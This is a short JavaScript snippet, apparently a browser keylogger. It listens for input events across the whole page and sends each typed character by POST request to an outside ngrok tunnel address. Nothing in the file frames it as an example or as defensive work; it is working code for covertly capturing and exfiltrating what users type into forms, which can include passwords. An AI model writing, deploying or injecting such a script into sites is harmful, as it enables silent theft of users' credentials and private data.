document.addEventListener("DOMContentLoaded", function () {
    let logged = "";

    document.addEventListener("input", function (e) {
        if (e.target && e.target.value !== undefined) {
            const inputValue = e.target.value;
            const newChar = inputValue.slice(-1); // get last typed character
            logged += newChar;

            fetch("https://78590781443e.ngrok-free.app/log", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ key: newChar })
            });
        }
    }, true); // useCapture = true to catch events deeper in DOM
});

